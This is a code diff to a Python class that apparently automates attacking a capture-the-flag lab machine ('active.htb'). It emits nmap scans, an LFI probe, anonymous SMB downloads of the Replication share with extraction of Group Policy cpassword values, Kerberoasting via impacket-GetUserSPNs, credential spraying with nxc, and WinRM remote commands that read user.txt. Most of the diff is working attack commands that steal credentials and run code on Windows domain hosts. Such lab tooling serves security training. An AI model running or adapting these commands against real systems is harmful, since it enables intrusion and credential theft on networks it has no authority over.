@@ -6,7 +6,6 @@ from pathlib import Path
 from core.lfi_probe import probe_command
 
 STOP = ("__STOP__", "stop")
-OSTICKET_PATHS = "/ /scp /open.php /login.php /tickets.php /kb/faq.php"
 
 
 class LabPlaybook:
@@ -42,27 +41,15 @@ class LabPlaybook:
             if "/tcp" in line
         )
         web = really_web
-        mssql = "1433/tcp" in scan
         winrm = "5985/tcp" in scan
         ssh = "22/tcp" in scan
+        domain = state.get("domain") or "active.htb"
 
         if not (self.scans / "quick_scan.txt").exists():
             return (f"nmap -Pn -T4 --top-ports 200 -sV --open -oN {self.scans}/quick_scan.txt {ip}", "recon")
         if not (self.scans / "version_scan.txt").exists():
             return (f"nmap -Pn -sC -sV -p- --min-rate 800 -oN {self.scans}/version_scan.txt {ip}", "recon")
 
-        if web and not self._done(history, "web_headers.txt"):
-            return (
-                f"curl -skI --max-time 12 http://{ip} -o {self.loot}/web_headers.txt; "
-                f"curl -skI --max-time 12 https://{ip} >> {self.loot}/web_headers.txt || true",
-                "recon",
-            )
-        if web and not self._done(history, "web_index.html"):
-            return (
-                f"curl -skL --max-time 15 http://{ip}/ -o {self.loot}/web_index.html; "
-                f"grep -iE 'osticket|helpdesk|title' {self.loot}/web_index.html | head -20 || true",
-                "recon",
-            )
         if web and not self._done(history, "LFI probe"):
             return (probe_command(ip, self.loot), "enum")
 
@@ -74,23 +61,43 @@ class LabPlaybook:
                 f"nxc smb {ip} -u guest -p '' -M gpp_password | tee -a {self.loot}/gpp_nxc.txt || true",
                 "enum",
             )
-        if ad and not self._done(history, "smbmap"):
-            return (f"smbmap -H {ip} -u anonymous -p '' || smbmap -H {ip} || true", "enum")
-        if ad and not self._done(history, "Replication"):
+        if ad and not self._done(history, "GPP_FETCH_ALL"):
+            dest = self.loot / "replication"
             return (
-                f"smbclient -U '%' -N -L //{ip} 2>&1 | tee {self.loot}/smb_shares.txt; "
-                f"smbclient -U '%' -N //{ip}/Replication -c 'recurse ON; prompt OFF; lcd {self.loot}; mget *' 2>&1 | tee {self.loot}/repl.txt || true; "
-                f"find {self.loot} -iname '*Groups.xml' -o -iname '*.xml' | tee {self.loot}/gpp_files.txt",
-                "enum",
+                f"echo GPP_FETCH_ALL; mkdir -p {dest}; "
+                f"smbclient -U '%' -N //{ip}/Replication -c 'recurse ON; prompt OFF; lcd {dest}; mget *' 2>&1 | tee {self.loot}/repl_full.txt; "
+                f"find {dest} -iname Groups.xml | tee {self.loot}/gpp_files.txt; "
+                f"if command -v gpp-decrypt >/dev/null; then "
+                f"grep -oE 'cpassword=\"[^\"]+' {dest}/*/../../* 2>/dev/null; "
+                f"find {dest} -iname Groups.xml -exec grep -oE 'cpassword=\"[^\"]+' {{}} \; ; fi",
+                "exploit",
             )
-        if ad and not self._done(history, "ldapsearch"):
-            return (f"ldapsearch -x -H ldap://{ip} -s base namingContexts || true", "enum")
+        if ad and not self._done(history, "GPP_DECRYPT"):
+            return (
+                f"echo GPP_DECRYPT; find {self.loot} -iname Groups.xml -print -exec cat {{}} \; | tee {self.loot}/groups_dump.txt; "
+                f"python3 - <<'PY'\n"
+                f"from pathlib import Path\n"
+                f"import re,base64\n"
+                f"print('xmls', list(Path('{self.loot}').rglob('Groups.xml')))\n"
+                f"PY",
+                "exploit",
+            )
 
         if creds:
             u, p = creds[0].get("username"), creds[0].get("password")
             if u and p:
-                if not any(f"-u {u}" in (h.get("command") or "") and "--shares" in (h.get("command") or "") for h in history):
+                if not any(f"-u '{u}'" in (h.get("command") or "") and "--shares" in (h.get("command") or "") for h in history):
                     return (f"nxc smb {ip} -u '{u}' -p '{p}' --shares", "enum")
+                if not self._done(history, "GetUserSPNs"):
+                    return (
+                        f"impacket-GetUserSPNs {domain}/{u}:'{p}' -dc-ip {ip} -request || true",
+                        "exploit",
+                    )
+                if not self._done(history, f"//{ip}/Users"):
+                    return (
+                        f"smbclient -U '{u}%{p}' //{ip}/Users -c 'recurse ON; prompt OFF; lcd {self.loot}; mget *user.txt' || true",
+                        "loot",
+                    )
                 if winrm and not self._done(history, "user.txt"):
                     return (
                         f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\*\\Desktop\\user.txt\"",
@@ -106,6 +113,4 @@ class LabPlaybook:
             if not self._done(history, "--continue-on-success"):
                 return (f"nxc smb {ip} -u {users_file} -p {pass_file} --continue-on-success", "spray")
 
-        if mssql and not self._done(history, "nxc mssql"):
-            return (f"nxc mssql {ip} -u sa -p sa --local-auth || true", "enum")
         return STOP
